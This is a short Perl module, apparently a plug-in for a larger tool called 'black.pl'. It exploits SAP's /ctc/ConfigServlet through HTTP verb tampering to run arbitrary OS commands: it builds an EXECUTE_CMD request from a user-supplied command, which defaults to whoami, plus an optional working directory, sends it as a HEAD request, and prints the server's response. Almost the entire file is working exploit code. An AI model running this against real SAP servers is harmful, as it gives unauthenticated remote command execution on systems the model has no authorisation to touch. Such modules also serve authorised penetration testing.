#!/usr/bin/perl
# Module command execute through head
# CONFIG
######################
my $desc ="Command execution (verb tampering) \n\t Usage: black.pl .. .. $argv[5] <command> <work_dir> \n\t <command> -  OS command to execute, default is WHOAMI\n\n"; 
our $funcName="exec_cmd_java_head_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub exec_cmd_java_head_Func()
{

	if ($ARGV[$m_arg_i+1]){
		$cmd=$ARGV[$m_arg_i+1];
		print $cmd." - command \n\n";
	} else {
		$cmd='whoami';
	}
	if ($ARGV[$m_arg_i+2]){
		$wd=$ARGV[$m_arg_i+2];
		print $wd." - work dir \n\n";
	} 
	
	my $XML='';
	my $part_url="/ctc/ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=$cmd";
	
	if($wd){$part_url.=",WORKDIR=$wd";}
	
	my @answers=send_soap($XML,1,$part_url,"HEAD",1);
	my $answer=join('', @answers);
	
	print $answer;

	print "\n\n";

}